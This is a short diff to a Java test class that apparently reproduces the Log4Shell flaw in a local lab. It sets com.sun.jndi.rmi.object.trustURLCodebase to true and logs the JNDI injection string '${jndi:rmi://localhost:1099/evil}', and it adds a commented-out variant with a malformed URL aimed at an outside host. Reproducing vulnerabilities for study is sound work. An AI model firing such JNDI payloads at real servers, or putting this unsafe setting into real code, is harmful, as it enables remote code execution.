@@ -13,6 +13,7 @@ public class Log4jTest {
         // JDK开启远程调用
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
         String input="${jndi:rmi://localhost:1099/evil}";
+        //input="${jndi:rmi://https://www.baidu.com}";
         logger.error("input,{}",input);
     }
 }
